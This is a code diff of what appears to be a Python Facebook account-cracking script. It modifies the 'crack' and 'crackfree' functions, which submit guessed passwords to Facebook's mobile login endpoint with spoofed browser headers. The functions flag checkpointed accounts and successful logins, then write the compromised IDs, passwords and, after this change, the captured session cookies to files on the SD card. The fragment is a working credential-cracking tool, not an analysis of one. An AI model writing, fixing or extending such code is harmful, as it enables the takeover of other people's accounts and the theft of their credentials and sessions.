@@ -619,7 +619,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;94m[Tutul-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
-                open('/sdcard/cpanox.txt,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/cpanox.txt','a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -627,9 +627,9 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[ANOX-🙆OK] {idf} • {pw}\n\033[0;93m[😎]= \033[0;92m{kuki} ')
+                print(f'\r\033[0;92m[ANOX-🙆OK] {idf} | {pw}\n\033[0;93m[😎]= \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " Tutul,  Ok,  id"')
-                open('/sdcard/anoxok.txt','a').write(idf+' • '+pw+'\n')
+                open('/sdcard/anoxok.txt','a').write(idf+' | '+pw+' | '+kuki+'\n')
                 break
                 
             else:
@@ -659,10 +659,10 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ANOX] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
-                open('/sdcard/cpAnox.txt','a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
+                open('/sdcard/cpAnox.txt','a').write(idf+' | '+pw+'\n')
+                akun.append(idf+' | '+pw)
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
